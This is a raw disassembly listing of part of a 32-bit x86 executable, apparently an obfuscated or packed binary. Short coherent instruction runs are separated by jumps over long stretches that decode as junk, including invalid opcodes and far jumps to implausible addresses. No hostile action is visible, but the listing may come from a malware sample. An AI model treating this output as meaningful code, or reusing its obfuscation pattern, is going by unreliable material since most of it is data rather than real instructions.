  402967:	or     BYTE PTR [edx],dh
  402969:	xlat   BYTE PTR ds:[ebx]
  40296a:	imul   eax,DWORD PTR [eax+0x6e0d3bd0],0x67dd2b5d
  402974:	(bad)  
  402975:	ficom  WORD PTR [ecx]
  402977:	add    ebx,ebx
  402979:	add    DWORD PTR es:[edi],eax
  40297c:	pop    esp
  40297d:	int3   
  40297e:	dec    esi
  40297f:	jl     0x402958
  402981:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  402983:	push   0xc
  402985:	(bad)  
  402986:	mov    bl,0x42
  402988:	pop    edi
  402989:	cli    
  40298a:	lahf   
  40298b:	cmp    dl,BYTE PTR ds:0x2c17d6c7
  402991:	ss push ss
  402993:	xor    al,0xc1
  402995:	mov    cl,0x59
  402997:	push   0x4140f415
  40299c:	inc    esi
  40299d:	es es xchg ecx,eax
  4029a0:	imul   esi,DWORD PTR [edi-0x5373ca8],0xffffffe4
  4029a7:	test   eax,0x83fd84f5
  4029ac:	push   0xffffffca
  4029ae:	cmp    ah,BYTE PTR [esp+edi*2-0x2cd0779]
  4029b5:	das    
  4029b6:	jmp    0xb65d:0xd91d458f
  4029bd:	(bad)  
  4029be:	push   ss
  4029bf:	in     eax,0xe
  4029c1:	stos   DWORD PTR es:[edi],eax
  4029c2:	outs   dx,DWORD PTR ds:[esi]
  4029c3:	or     al,0x20
  4029c5:	les    ecx,FWORD PTR [ecx]
  4029c7:	mov    edx,0x9f778a79
  4029cc:	fist   WORD PTR [edx+0x6]
  4029cf:	push   cs
  4029d0:	sbb    dh,bh
  4029d2:	jecxz  0x402a1f
  4029d4:	ror    BYTE PTR [ecx],cl
  4029d6:	adc    eax,edi
  4029d8:	aas    
  4029d9:	fmulp  st(6),st
  4029db:	jbe    0x402999
  4029dd:	lahf   
  4029de:	rol    DWORD PTR [edx+0x1],cl
  4029e1:	and    ch,al
  4029e3:	xchg   ch,cl
  4029e5:	pusha  
  4029e6:	sbb    al,0xba
  4029e8:	mov    dl,0x40
  4029ea:	add    dl,dl
  4029ec:	in     al,dx
  4029ed:	pushf  
  4029ee:	(bad)
  4029f1:	scas   eax,DWORD PTR es:[edi]
  4029f2:	fmul   QWORD PTR [ecx+0x2c]
  4029f5:	xor    dl,bh
  4029f7:	out    dx,eax
  4029f8:	pop    ds
  4029f9:	fs stos BYTE PTR es:[edi],al
  4029fb:	aas    
  4029fc:	pop    ebp
  4029fd:	ds pop edi
  4029ff:	inc    ecx
  402a00:	jo     0x4029b7
  402a02:	mov    ds:0x2bb015ce,al
  402a07:	or     eax,0x7192e24a
  402a0c:	ja     0x402a7b
  402a0e:	mov    ah,BYTE PTR [esi]
  402a10:	push   edx
  402a11:	outs   dx,BYTE PTR ds:[esi]
  402a12:	push   esi
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	fnstcw WORD PTR [ebx]
  402a36:	or     eax,0x7e0daab8
  402a3b:	jle    0x402a37
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a11
  402a41:	jo     0x4029fd
  402a43:	xor    al,0x78
  402a45:	in     eax,0xf0
  402a47:	push   esi
  402a48:	enter  0xd759,0x21
  402a4c:	int3   
  402a4d:	mov    edi,0x1b9721a6
  402a52:	iret   
  402a53:	mov    ebx,0x1ce1b622
  402a58:	jae    0x402aa5
  402a5a:	mov    ah,0x6b
  402a5c:	xlat   BYTE PTR ds:[ebx]
  402a5d:	mov    ch,0x65
  402a5f:	xchg   ebp,eax
  402a60:	pop    esp
  402a61:	dec    esi
  402a62:	imul   ebp,DWORD PTR [ebp+0x53],0x13
  402a66:	clc    
  402a67:	lds    ebx,FWORD PTR [edi+0x72]
  402a6a:	and    esi,DWORD PTR [edx-0x1764e0a8]
  402a70:	dec    esi
  402a71:	and    bh,bh
  402a73:	std    
  402a74:	shr    BYTE PTR [ecx-0x76],0x18
  402a78:	sbb    DWORD PTR [ebx+0xb3261d],edi
  402a7e:	es adc esi,ecx
  402a81:	cmp    al,0x88
  402a83:	or     al,0xb8
  402a85:	mov    bh,0x8c
  402a87:	ss inc esi
  402a89:	mov    edi,0x2ffc089f
  402a8e:	cmp    ah,BYTE PTR [esi-0x7c]
  402a91:	xchg   ecx,edi
  402a93:	pop    ebx
  402a94:	sbb    eax,0x2c57d44d
  402a99:	in     eax,0x2a
  402a9b:	and    ecx,DWORD PTR [edx-0x4efcea56]
  402aa1:	sub    BYTE PTR [ebx+0x27],ch
  402aa4:	popa   
  402aa5:	or     ah,dh
  402aa7:	es retf 
  402aa9:	adc    BYTE PTR [ebp-0x10000b37],ch
  402aaf:	repz retf 
  402ab1:	or     BYTE PTR [eax-0x314bb1e0],bh
  402ab7:	xchg   BYTE PTR [edx+0x48e58296],bl
  402abd:	pop    ds
  402abe:	iret   
  402abf:	popa   
  402ac0:	test   al,0x20
  402ac2:	or     bl,dh
  402ac4:	frstor [ebx-0x3e]
  402ac7:	ds je  0x402a8a
  402aca:	test   al,0x7e
  402acc:	in     eax,dx
  402acd:	dec    ebx
  402ace:	sbb    ebp,ebx
  402ad0:	int    0x7c
  402ad2:	dec    esi
  402ad3:	in     eax,dx
  402ad4:	sti    
  402ad5:	sbb    edi,DWORD PTR [ebp+0x55]
  402ad8:	sar    BYTE PTR [edi+0x73],1
  402adb:	push   0x24
  402add:	fs jmp 0x50bb1da7
  402ae3:	jge    0x402b19
  402ae5:	mov    esp,0x775dba98
  402aea:	pusha  
  402aeb:	mov    es,WORD PTR [ebx+0x2df83bf9]
  402af1:	in     al,0x67
  402af3:	xor    al,0xa0
  402af5:	add    eax,0x4a7493f0
  402afb:	js     0x402b54
  402afd:	outs   dx,BYTE PTR ds:[esi]
  402afe:	mov    ah,0x8a
  402b00:	sar    BYTE PTR [esi],1
  402b02:	dec    ecx
  402b03:	cdq    
  402b04:	jmp    0x402ac1
  402b06:	lock pusha 
  402b08:	dec    edx
  402b09:	sub    eax,0x32b3e75
  402b0e:	jle    0x402aaf
  402b10:	test   eax,0x5718be2a
  402b15:	(bad)  
  402b16:	sahf   
  402b17:	fild   WORD PTR [edi-0x26]
  402b1a:	jno    0x402b03
  402b1c:	das    
  402b1d:	arpl   WORD PTR [esi+esi*1-0x5f],ax
  402b21:	loopne 0x402b5a
  402b23:	mov    ch,0xd6
  402b25:	stc    
  402b26:	adc    BYTE PTR ds:0xd6f25e05,cl
  402b2c:	mul    cl
  402b2e:	or     edx,DWORD PTR ds:0xfa1a7400
  402b34:	adc    ah,BYTE PTR [ebx+0x15]
  402b37:	xor    BYTE PTR [ecx+0x6465d4bf],al
  402b3d:	test   eax,0x850582cb
  402b42:	jmp    0x4735:0x37166728
  402b49:	call   0x2bf9:0x20da8e4
  402b50:	jge    0x402ae4
  402b52:	cmc    
  402b53:	jnp    0x402af0
  402b55:	stos   DWORD PTR es:[edi],eax
  402b56:	aas    
  402b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b58:	call   0x39eb:0x673d7806
  402b5f:	(bad)
  402b62:	lods   al,BYTE PTR ds:[esi]
  402b63:	fnsave [esi+0x4aece1ce]
  402b69:	push   ebp
  402b6a:	or     ch,bh
  402b6c:	sub    al,0x9d
  402b6e:	or     eax,0xb9b8020f
  402b73:	neg    cl
  402b75:	retf   
  402b76:	out    0x81,eax
  402b78:	aaa    
  402b79:	sbb    dl,BYTE PTR [edi-0x19]
  402b7c:	neg    BYTE PTR [ebx-0x67]
  402b7f:	stc    
  402b80:	xchg   BYTE PTR [ecx-0x24],dl
  402b83:	dec    ebp
  402b84:	cmp    DWORD PTR [edx+0x7a8822a3],edi
  402b8a:	or     al,0x63
  402b8c:	loop   0x402b28
  402b8e:	mov    edi,0xd29ae43f
  402b93:	sbb    ch,0xc0
  402b96:	daa    
  402b97:	xor    al,0xdb
  402b99:	mov    al,0x7d
  402b9b:	sbb    ch,BYTE PTR [esi]
  402b9d:	js     0x402c1a
  402b9f:	jp     0x402b75
  402ba1:	mov    fs,WORD PTR [edi+ebx*4]
  402ba4:	dec    ebx
  402ba5:	sub    edx,DWORD PTR [ebp*8-0x1cd13870]
  402bac:	adc    eax,0x9da9fd54
  402bb1:	jmp    0xce036c0a
  402bb6:	test   DWORD PTR [ecx-0x26],esp
  402bb9:	mov    ebp,fs
  402bbb:	push   es
  402bbc:	inc    esp
  402bbd:	adc    ebx,eax
  402bbf:	mov    cl,0xe4
  402bc1:	bound  ebp,QWORD PTR ds:0xfc08503
  402bc7:	test   BYTE PTR [eax],ch
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	fnsave [ebp+ecx*4+0x7e0b3654]
  402c18:	jle    0x402c14
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bf4
  402c1e:	cmp    bl,BYTE PTR [ebx+0x1c64796f]
  402c24:	neg    BYTE PTR [bp+si+0x38]
  402c28:	or     eax,0x75006eae
  402c2d:	leave  
  402c2e:	mov    esi,0xa47f85bc
  402c33:	jmp    0x615c:0xbedf29b3
  402c3a:	sub    ecx,edx
  402c3c:	pop    ebp
  402c3d:	call   0xa1e:0x933c871c
  402c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c45:	dec    ebp
  402c46:	xchg   esp,eax
  402c47:	add    esi,ebp
  402c49:	fdivp  st(6),st
  402c4b:	xor    DWORD PTR [ecx+0x136d0c71],esi
  402c51:	inc    ecx
  402c52:	enter  0xafd9,0xc1
  402c56:	xor    al,0xaa
  402c58:	xchg   ebx,eax
  402c59:	aaa    
  402c5a:	(bad)  
  402c5b:	retf   
  402c5c:	pop    edi
  402c5d:	or     DWORD PTR [esi+0x4fd1b8fd],eax
  402c63:	push   esi
  402c64:	pop    ebp
  402c65:	jle    0x402bf9
  402c67:	sub    dl,BYTE PTR [edi]
  402c69:	jmp    0xf147930a
  402c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c6f:	call   0xbcd596ba
  402c74:	jle    0x402c76
  402c76:	out    dx,eax
  402c77:	imul   ecx,DWORD PTR [ebp-0x1],0xffffffb8
  402c7b:	fldenv [esi]
  402c7d:	bound  edx,QWORD PTR [ebx]
  402c7f:	ds inc ebx
  402c81:	mov    eax,esp
  402c83:	shl    DWORD PTR [esi],1
  402c85:	jno    0x402c07
  402c87:	inc    esp
  402c88:	sub    eax,0xd4976495
  402c8d:	mov    ds:0x593242b3,eax
  402c92:	icebp  
  402c93:	(bad)  
  402c94:	or     eax,0x270253c9
  402c99:	dec    ecx
  402c9a:	das    
  402c9b:	adc    edx,DWORD PTR [edx]
  402c9d:	xchg   edi,eax
  402c9e:	enter  0x2ba6,0x3e
  402ca2:	test   al,0xb5
  402ca4:	call   0xdf7a:0xe3c4b2b4
  402cab:	push   ecx
  402cac:	push   cs
  402cad:	imul   esi,DWORD PTR [ebp+0x12e7a57d],0x957ae78d
  402cb7:	mov    ebx,0x6392d23f
  402cbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cbd:	addr16 push es
  402cbf:	mov    ch,0x43
  402cc1:	in     al,dx
  402cc2:	outs   dx,DWORD PTR ds:[esi]
  402cc3:	call   DWORD PTR [eax+0x12]
  402cc6:	test   eax,0x6898419a
  402ccb:	pop    edi
  402ccc:	xlat   BYTE PTR ds:[ebx]
  402ccd:	sti    
  402cce:	push   esp
  402ccf:	sbb    edi,DWORD PTR [ebx+0x1c97d173]
  402cd5:	and    BYTE PTR [edi],al
  402cd7:	mov    edi,ds
  402cd9:	inc    eax
  402cda:	mov    cl,0x73
  402cdc:	inc    ebp
  402cdd:	shl    ah,cl
  402cdf:	ins    BYTE PTR es:[edi],dx
  402ce0:	xor    eax,0xe5e221db
  402ce5:	dec    ecx
  402ce6:	cmp    eax,0x9fef6d7b
  402ceb:	push   edi
  402cec:	or     al,0xb8
  402cee:	xchg   DWORD PTR [edi-0x6b8a113e],eax
  402cf4:	add    eax,0x4304a53c
  402cf9:	daa    
  402cfa:	cmp    ch,BYTE PTR [edx]
  402cfc:	(bad)  
  402cfd:	enter  0xd79,0x22
  402d01:	adc    al,0x98
  402d03:	xor    ecx,edx
  402d05:	into   
  402d06:	sbb    eax,DWORD PTR [esp+ebx*2+0x24]
  402d0a:	js     0x402cfa
  402d0c:	sbb    dl,dl
  402d0e:	nop
  402d0f:	mov    WORD PTR [edi+ebp*4+0x12fd3b48],ss
  402d16:	dec    BYTE PTR [edi]
  402d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d19:	xchg   edi,eax
  402d1a:	push   0x41a4b3f2
  402d1f:	xchg   esi,eax
  402d20:	xor    eax,0xcb781e82
  402d25:	nop
  402d26:	jl     0x402d37
  402d28:	xlat   BYTE PTR ds:[ebx]
  402d29:	gs je  0x402d3e
  402d2c:	sub    al,0x5c
  402d2e:	inc    esp
  402d2f:	xor    edi,DWORD PTR [eax+ecx*8+0x3db5504c]
  402d36:	jmp    0xedd71cae
  402d3b:	inc    esp
  402d3c:	inc    edx
  402d3d:	das    
  402d3e:	aam    0x8e
  402d40:	iret   
  402d41:	fistp  WORD PTR [esi-0x45dfc44a]
  402d47:	jno    0x402d08
  402d49:	xor    BYTE PTR [edx+0x75],0x17
  402d4d:	in     eax,0xd3
  402d4f:	mov    ah,0x8d
  402d51:	add    al,0x87
  402d53:	push   edx
  402d54:	rcr    DWORD PTR [eax],cl
  402d56:	retf   0x6523
  402d59:	mov    al,ds:0xf838ba42
  402d5e:	sbb    esp,ebp
  402d60:	xor    DWORD PTR [ebx+0x3c],edx
  402d63:	data16 fistp DWORD PTR [eax+0x641c979]
  402d6a:	pushf  
  402d6b:	dec    ebx
  402d6c:	mov    BYTE PTR [ebp+0x27c5773d],al
  402d72:	cmp    esi,edi
  402d74:	jae    0x402d5a
  402d76:	adc    cl,BYTE PTR [eax]
  402d78:	test   al,0x7a
  402d7a:	mov    bh,0x90
  402d7c:	imul   ebp,ebp,0x7067e1ec
  402d82:	sbb    ah,BYTE PTR [esi+0x5f60c027]
  402d88:	adc    DWORD PTR [esi-0x80],esp
  402d8b:	callw  0x8b05
  402d8f:	cmp    DWORD PTR [esp+ebp*4],edx
  402d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d94:	loope  0x402d97
  402d96:	cld    
  402d97:	mov    ds:0x5f706ac1,al
  402d9c:	cs in  eax,dx
  402d9e:	xor    BYTE PTR [edx+0x6d],dh
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebp+ebx*2-0x37],1
  402de7:	push   ebx
  402de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402da4
  402df2:	sti    
  402df3:	mov    eax,ds:0x31d74d2
  402df8:	sub    eax,DWORD PTR [edi+0x22]
  402dfb:	or     esp,DWORD PTR [eax-0x5c]
  402dfe:	fstp   st(0)
  402e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e01:	mov    cl,0x40
  402e03:	das    
  402e04:	cmp    al,0xc2
  402e06:	sbb    eax,0x6ff6a492
  402e0b:	inc    edi
  402e0c:	retf   
  402e0d:	dec    eax
  402e0e:	(bad)  
  402e0f:	(bad)  
  402e10:	loop   0x402e3f
  402e12:	out    0xd1,al
  402e14:	pop    esi
  402e15:	int    0x8a
  402e17:	mov    BYTE PTR gs:[esi+0x1f],bl
  402e1b:	dec    eax
  402e1c:	gs pop ebx
  402e1e:	dec    edi
  402e1f:	and    DWORD PTR es:[ecx+0x22],esp
  402e23:	fscale 
  402e25:	push   ebx
  402e26:	stos   DWORD PTR es:[edi],eax
  402e27:	cs dec edx
  402e29:	enter  0xf857,0x8d
  402e2d:	test   eax,0x6155f10e
  402e32:	repz ror bh,1
  402e35:	aaa    
  402e36:	adc    eax,0xd3663c4e
  402e3b:	xchg   ebp,eax
  402e3c:	mov    WORD PTR [edx+0x692aff36],cs
  402e42:	das    
  402e43:	outs   dx,DWORD PTR ds:[esi]
  402e44:	mov    bl,0x1
  402e46:	jmp    0x70fb:0x582f168d
  402e4d:	stc    
  402e4e:	call   DWORD PTR [edx]
  402e50:	xchg   DWORD PTR [edi-0x38657c15],ecx
  402e56:	lahf   
  402e57:	je     0x402e2e
  402e59:	int3   
  402e5a:	sar    DWORD PTR [edx+ecx*4],cl
  402e5d:	test   eax,0x133e966b
  402e62:	shl    BYTE PTR [esi],cl
  402e64:	or     al,0xf8
  402e66:	push   ebp
  402e67:	pop    edx
  402e68:	add    eax,0x7b1967b9
  402e6d:	xchg   esi,eax
  402e6e:	mov    edx,0xa4873a54
  402e73:	addr16 retf 0x5af
  402e77:	jb     0x402e8b
  402e79:	jecxz  0x402e3b
  402e7b:	jg     0x402e70
  402e7d:	(bad)  
  402e7e:	cmp    DWORD PTR [ebp+0x5ee9447f],edi
  402e84:	ja     0x402eec
  402e86:	popa   
  402e87:	and    al,0xdb
  402e89:	sbb    al,cl
  402e8b:	jnp    0x402f05
  402e8d:	or     bh,BYTE PTR [ecx-0x2dca429d]
  402e93:	aam    0x32
  402e95:	mov    ebx,es
  402e97:	pop    edi
  402e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e99:	and    DWORD PTR [ebx+0x49],ebp
  402e9c:	sub    al,0xa6
  402e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e9f:	popa   
  402ea0:	and    cl,BYTE PTR [ebp-0x24]
  402ea3:	inc    eax
  402ea4:	pop    edi
  402ea5:	test   DWORD PTR [esi+0x4d],0x4d811170
  402eac:	inc    edi
  402ead:	xor    dh,BYTE PTR [ebp-0xd71ac95]
  402eb3:	fsubr  DWORD PTR [edx+0x1679c474]
  402eb9:	das    
  402eba:	and    al,BYTE PTR [ebx-0x1de4f847]
  402ec0:	arpl   WORD PTR [edx+ebp*8],di
  402ec3:	mov    edi,0x4f214852
  402ec8:	xor    BYTE PTR [eax-0x5a],0xf8
  402ecc:	sbb    edi,DWORD PTR [edi]
  402ece:	or     al,0x6f
  402ed0:	loop   0x402f25
  402ed2:	shr    BYTE PTR [ebp+eiz*4+0x39451b1e],cl
  402ed9:	jns    0x402eb0
  402edb:	pop    esi
  402edc:	and    ch,al
  402ede:	arpl   bx,cx
  402ee0:	push   ebp
  402ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee2:	cwde   
  402ee3:	sub    eax,0x550ebe75
  402ee8:	inc    ebp
  402ee9:	push   0xffffffe4
  402eeb:	lods   eax,DWORD PTR ds:[esi]
  402eec:	pop    es
  402eed:	add    BYTE PTR [edx-0xc],cl
  402ef0:	add    ebp,DWORD PTR [ecx]
  402ef2:	fisubr WORD PTR [ebx+0x10b7a60d]
  402ef8:	pop    eax
  402ef9:	inc    eax
  402efa:	aad    0x2e
  402efc:	call   0x12fa13e1
  402f01:	adc    ecx,ebx
  402f03:	xchg   ebp,eax
  402f04:	and    bh,dl
  402f06:	and    eax,0xf6cd7c93
  402f0b:	xor    al,0x1a
  402f0d:	xor    eax,0x89023366
  402f12:	test   DWORD PTR [ebp+0x49],ecx
  402f15:	jae    0x402f65
  402f17:	shl    bh,cl
  402f19:	inc    edi
  402f1a:	lods   eax,DWORD PTR ds:[esi]
  402f1b:	rsm    
  402f1d:	adc    BYTE PTR [eax+0x5ae67d51],bh
  402f23:	pop    es
  402f24:	not    DWORD PTR [esi+esi*8-0x1104cefc]
  402f2b:	push   edi
  402f2c:	jg     0x402fa8
  402f2e:	into   
  402f2f:	test   DWORD PTR [edx+0x20a679cb],esp
  402f35:	push   eax
  402f36:	mov    dh,0x7
  402f38:	mov    edi,0xfaaf4d8f
  402f3d:	data16 repnz aas 
  402f40:	paddusw mm2,QWORD PTR [ebx+0x1f]
  402f44:	(bad)  
  402f45:	cdq    
  402f46:	sbb    esi,ebp
  402f48:	sub    al,0xda
  402f4a:	sub    al,0xa8
  402f4c:	stos   BYTE PTR es:[edi],al
  402f4d:	outs   dx,DWORD PTR ds:[esi]
  402f4e:	and    ebp,DWORD PTR [esi-0x52]
  402f51:	retf   
  402f52:	jnp    0x402ef1
  402f54:	mov    ebx,ecx
  402f56:	push   es
  402f57:	jmp    0x402f26
  402f59:	xchg   esi,eax
  402f5a:	fldenv [ebx+0x15141ef4]
  402f60:	shl    BYTE PTR [eax-0xe],cl
  402f63:	push   ebx
  402f64:	and    al,BYTE PTR [ebx-0x6a]
  402f67:	call   0xe1627d79
  402f6c:	or     ecx,DWORD PTR [ebp-0xa]
  402f6f:	(bad)  
  402f70:	jns    0x402f43
  402f72:	xchg   edi,eax
  402f73:	fnstcw WORD PTR [eax-0x73]
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x77b55a49]
  402fae:	cmp    al,0xee
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f6f
  402fb9:	and    ah,dl
  402fbb:	push   0x7e
  402fbd:	(bad)  
  402fbe:	sub    ah,BYTE PTR [ebx+0x58d6243]
  402fc4:	push   eax
  402fc5:	(bad)
  402fc8:	mov    bl,0xc5
  402fca:	xor    BYTE PTR [edi+0x60],al
  402fcd:	shr    BYTE PTR [ebx+0x7a20e95e],0xf4
  402fd4:	loope  0x402ff7
  402fd6:	ja     0x402fea
  402fd8:	xchg   BYTE PTR [ecx-0x563fee57],dh
  402fde:	push   0x78
  402fe0:	call   0x37c7aabd
  402fe5:	fnsave [ecx+0xd]
  402fe8:	cmp    bl,ch
  402fea:	js     0x403063
  402fec:	pop    ebx
  402fed:	les    edx,FWORD PTR [esi+0x30]
  402ff0:	shr    DWORD PTR [edx+0x8],1
  402ff3:	shl    DWORD PTR [edi-0x2],cl
  402ff6:	mov    ebp,0x84342eea
  402ffb:	add    esp,DWORD PTR [ecx]
  402ffd:	out    dx,eax
  402ffe:	fs pop ss
  403000:	ret    0x1809
  403003:	fild   DWORD PTR [ecx]
  403005:	add    DWORD PTR [edx+0x62],edi
  403008:	and    edi,DWORD PTR [eax+0x2145cabf]
  40300e:	xchg   ecx,eax
  40300f:	adc    dh,BYTE PTR [edx+edi*4]
  403012:	(bad)  
  403013:	dec    ebp
  403014:	mov    DWORD PTR [edx+edi*2+0x3d],ecx
  403018:	sbb    al,0xcb
  40301a:	and    cl,BYTE PTR [eax+0x47c24b63]
  403020:	push   esp
  403021:	pushf  
  403022:	jecxz  0x402fce
  403024:	add    eax,0xe6c155fe
  403029:	mov    edx,0xa8c17099
  40302e:	fadd   DWORD PTR [edi+0x401c3836]
  403034:	dec    edi
  403035:	(bad)  
  403036:	sub    BYTE PTR es:[ecx-0x20824157],ah
  40303d:	inc    ecx
  40303e:	shl    DWORD PTR [ecx-0x2f],0xc2
  403042:	mov    ecx,edx
  403044:	loope  0x402fcc
  403046:	or     edx,eax
  403048:	jnp    0x4030ac
  40304a:	inc    ecx
  40304b:	pop    esi
  40304c:	add    BYTE PTR [esi-0x133e5e62],dl
  403052:	mov    ebx,0x9980a613
  403057:	mov    ds:0x1f620b96,eax
  40305c:	jecxz  0x402ff1
  40305e:	ss pop edi
  403060:	mov    ebp,0xfe531abe
  403065:	jg     0x402ffe
  403067:	and    al,0x1e
  403069:	das    
  40306a:	or     BYTE PTR [edx-0x46],0x93
  40306e:	dec    esi
  40306f:	push   ebp
  403070:	in     eax,dx
  403071:	fmul   st(7),st
  403073:	and    cl,0x29
  403076:	data16 test bl,ch
  403079:	mul    BYTE PTR [edi]
  40307b:	xor    al,0xe3
  40307d:	sbb    al,0x4
  40307f:	dec    ebx
  403080:	popa   
  403081:	test   al,0x92
  403083:	mov    cs,WORD PTR [esi+0x6f962f46]
  403089:	fwait
  40308a:	or     esi,edi
  40308c:	dec    esi
  40308d:	in     eax,0x64
  40308f:	push   cs
  403090:	mov    bh,BYTE PTR [edx-0x198f4d85]
  403096:	(bad)
  40309a:	sbb    DWORD PTR [ebx-0x42],ecx
  40309d:	adc    BYTE PTR [esi+0x1c6195a1],dl
  4030a3:	in     al,dx
  4030a4:	das    
  4030a5:	jb     0x40310a
  4030a7:	cmp    al,0x2b
  4030a9:	mov    bl,0xb0
  4030ab:	ins    DWORD PTR es:[edi],dx
  4030ac:	mov    ah,0x6b
  4030ae:	loop   0x403095
  4030b0:	jae    0x40310f
  4030b2:	int3   
  4030b3:	push   edi
  4030b4:	mov    edx,0xa8d1e928
  4030b9:	jbe    0x403056
  4030bb:	push   ebp
  4030bc:	ds and al,0x25
  4030bf:	mov    bh,0x18
  4030c1:	inc    esp
  4030c2:	jae    0x4030cc
  4030c4:	add    cl,0x81
  4030c7:	dec    ebp
  4030c8:	sbb    cl,BYTE PTR [ebp+0x301786f5]
  4030ce:	fisubr WORD PTR [esp+esi*2]
  4030d1:	lods   eax,DWORD PTR ds:[esi]
  4030d2:	ret    0x8958
  4030d5:	push   si
  4030d7:	or     ebp,DWORD PTR [edx+0x22]
  4030da:	fild   QWORD PTR [ebx+0x46]
  4030dd:	xchg   ebp,eax
  4030de:	pop    edi
  4030df:	pop    esp
  4030e0:	hlt    
  4030e1:	or     eax,0x63f24d72
  4030e6:	xor    eax,0x6411bc9b
  4030eb:	jl     0x40311d
  4030ed:	pushf  
  4030ee:	hlt    
  4030ef:	daa    
  4030f0:	outs   dx,DWORD PTR ds:[esi]
  4030f1:	mov    WORD PTR [ecx],fs
  4030f3:	leave  
  4030f4:	and    DWORD PTR [ebx-0x4c47d8ea],edi
  4030fa:	sbb    dl,BYTE PTR ds:0xf1d43eb
  403100:	scas   al,BYTE PTR es:[edi]
  403101:	lods   al,BYTE PTR ds:[esi]
  403102:	xlat   BYTE PTR ds:[ebx]
  403103:	sbb    dh,0xd4
  403106:	int3   
  403107:	sar    esp,cl
  403109:	xchg   esi,eax
  40310a:	ins    DWORD PTR es:[edi],dx
  40310b:	mov    ebx,0x60621515
  403110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403111:	ret    
  403112:	pop    ebx
  403113:	sub    BYTE PTR [ebp+edx*1+0x2f],al
  403117:	pop    es
  403118:	xor    dl,BYTE PTR fs:[esi+0x21]
  40311c:	ffree  st(1)
  40311e:	sbb    eax,0x25504b73
  403123:	ss push es
  403125:	mov    ebx,0xeb675884
  40312a:	(bad)  
  40312b:	mov    ebp,0xd5c9cd09
  403130:	push   cs
  403131:	jno    0x4031a5
  403133:	mov    al,ds:0xc4c0e901
  403138:	cli    
  403139:	je     0x403122
  40313b:	xchg   edi,eax
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
